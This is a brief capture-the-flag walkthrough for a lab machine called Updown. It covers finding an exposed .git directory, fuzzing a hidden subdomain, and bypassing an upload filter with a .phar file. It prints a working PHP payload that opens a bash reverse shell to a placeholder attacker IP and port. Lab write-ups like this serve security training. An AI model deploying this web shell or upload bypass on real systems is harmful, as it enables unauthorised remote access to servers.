# Updown

This machine has classic HTTP/SSH config, nothing more, but a basic enumeration reveals "hidden" `.git/` dir in `/dev/` subfolder.

You can download the folder or use dedicated tools, such as GitHacker. One of the commits indicates a _fantastic_ technique used by the dev team to protect their vhost.
They use a classic subdomain you can found with any wordlist containing common subdomains (e.g., wfuzz, Gobuster). You might even guess it!

There's a form you need to abuse to upload a backdoor and pass arbitrary commands. It's possible because the form has an input for uploads and you have access to the code that processes the form in the git history. Many formats are disallowed but not `.phar`, which is a classic hack.

There are more work after that, but the payload to upload with the form looks like the following:

```
<?php
$descriptor_spec = array(
   0 => array( "pipe", "r" ),
   1 => array( "pipe", "w" ),
   2 => array( "file", "/tmp/errors.txt", "a" ),// stderr
);

$process = proc_open("bash", $descriptor_spec, $pipes, "/tmp");
// replace with your IP and listening port
fwrite($pipes[0], 'bash -i >& /dev/tcp/{YOUR_ATTACKER_IP}/{YOUR_PORT} 0>&1');
fclose($pipes[0]);
echo stream_get_contents($pipes[1]);
fclose($pipes[1]);
$return_value = proc_close($process);
echo "command returned $return_value\n";
?>
```

After that you can navigate to the uploaded .phar and get your shell.
